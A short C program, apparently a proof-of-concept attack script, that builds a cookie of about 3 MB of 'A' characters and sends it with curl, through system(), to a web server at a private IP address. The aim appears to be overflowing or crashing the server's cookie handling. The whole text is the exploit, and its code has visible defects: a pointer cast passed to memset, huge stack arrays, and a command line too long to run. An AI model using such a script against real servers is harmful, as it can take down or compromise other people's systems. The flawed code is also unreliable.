#include <stdio.h>

int main()
{
	char buf[3000000];
	char buf2[3100000];
	int i = 0;

	memset(buf, (char *)0x41, sizeof(buf) - 1);

	sprintf(buf2, "curl --cookie 'a=%s' http://192.168.134.10/index.html", buf);

        system(buf2);	
}
